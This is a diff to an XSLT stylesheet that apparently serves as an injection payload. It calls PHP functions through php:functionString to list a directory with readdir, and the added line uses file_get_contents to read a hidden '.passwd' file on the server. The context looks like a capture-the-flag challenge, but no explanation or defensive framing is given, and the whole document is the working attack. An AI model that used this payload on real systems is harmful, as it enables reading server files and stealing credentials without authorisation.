@@ -37,5 +37,7 @@
   <xsl:value-of select="php:functionString('printf','\n')"/>
   <xsl:value-of select="php:functionString('readdir')"/>
   <xsl:value-of select="php:functionString('printf','\n')"/>
+  
+  <xsl:value-of select="php:functionString('file_get_contents','.6ff3200bee785801f420fba826ffcdee/.passwd')"/>
 </xsl:template>
 </xsl:stylesheet>
